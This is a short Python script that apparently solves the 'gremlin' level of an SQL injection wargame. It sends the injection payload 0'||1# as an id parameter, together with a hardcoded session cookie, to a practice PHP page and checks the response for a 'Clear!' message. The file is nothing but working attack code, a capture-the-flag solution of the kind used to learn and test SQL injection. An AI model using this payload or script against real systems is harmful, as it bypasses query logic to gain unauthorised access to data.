# coding: utf-8

'''
    GREMLIN
    1．コメントを活用
    2．orを活用
'''
import requests
import re

if __name__ == "__main__":
    cookies = {'PHPSESSID': '1n2m871r2tvs2q678csnl0o3u0'}
    url = 'https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php'
    # ?id=0'||1%23
    params = {'id': "0'||1#"}
    r = requests.get(url=url, params=params, cookies=cookies)
    responseStr = r.content.decode('utf-8')
    print(responseStr)

    clearPattern = re.compile(r'Clear\!')
    if clearPattern.search(responseStr):
        print('yes')
    else:
        print('no')